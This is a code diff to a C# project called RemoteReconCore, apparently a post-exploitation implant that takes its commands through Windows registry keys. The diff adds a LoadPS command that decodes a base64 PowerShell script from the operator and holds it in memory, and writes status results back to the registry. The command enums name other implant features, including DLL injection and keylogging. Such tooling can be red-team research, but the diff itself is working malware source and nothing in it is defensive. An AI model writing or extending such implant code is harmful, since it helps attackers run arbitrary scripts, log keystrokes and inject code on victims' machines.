@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Text;
+using System.Text.RegularExpressions;
 using Microsoft.Win32;
 using System.Security.Principal;
 using System.Threading;
@@ -141,6 +142,17 @@ namespace RemoteReconCore
                         command = new KeyValuePair<int, object>(0, "");
                         result = new KeyValuePair<int, string>(0, "");
                         break;
+                    case (int)Cmd.LoadPS:
+#if DEBUG
+                        Console.WriteLine("Writing Load Script command result");
+#endif
+                        rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
+                        rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
+                        rrbase.SetValue(commandkey, 0);
+                        rrbase.SetValue(argumentkey, "");
+                        command = new KeyValuePair<int, object>(0, "");
+                        result = new KeyValuePair<int, string>(0, "");
+                        break;
                     default:
                         break;
                 }
@@ -185,6 +197,15 @@ namespace RemoteReconCore
                 string decoded = Encoding.ASCII.GetString(Convert.FromBase64String((string)command.Value));
                 PowerShell ps = new PowerShell(decoded);
                 result = ps.Run();
+            }
+            else if ((int)Cmd.LoadPS == command.Key)
+            {
+                if (loadedScript.Length != 0)
+                    loadedScript.Remove(0, loadedScript.Length);
+
+                loadedScript.Append(Encoding.ASCII.GetString(Convert.FromBase64String((string)command.Value)));
+                string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Script successfully loaded"));
+                result = new KeyValuePair<int, string>(0, msg);
             }
             else if ((int)Cmd.Revert == command.Key)
             {
@@ -241,6 +262,7 @@ namespace RemoteReconCore
                 string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Sleep is set to " + interval));
                 result = new KeyValuePair<int, string>(0, msg);
             }
+            
         }
 
         //Some static class variables 
@@ -254,6 +276,7 @@ namespace RemoteReconCore
         private static KeyValuePair<int, string> result;
         public static RegistryKey rrbase;
         public static Thread thr;
+        public static StringBuilder loadedScript = new StringBuilder();
 
         //Result enum for commnands
         public enum Result : int
@@ -266,7 +289,8 @@ namespace RemoteReconCore
             RevertFailed = 5,
             InjectDllFailed = 6,
             KeylogStopFailed = 7,
-            SleepFailed = 8
+            SleepFailed = 8,
+            LoadPS = 9
         }
 
         //Command enum 
@@ -280,7 +304,8 @@ namespace RemoteReconCore
             Revert = 5,
             InjectDll = 6,
             KeylogStop = 7,
-            Sleep = 8
+            Sleep = 8,
+            LoadPS = 9
         }
         
         //Helper function to patch the Native module with the appropriate command
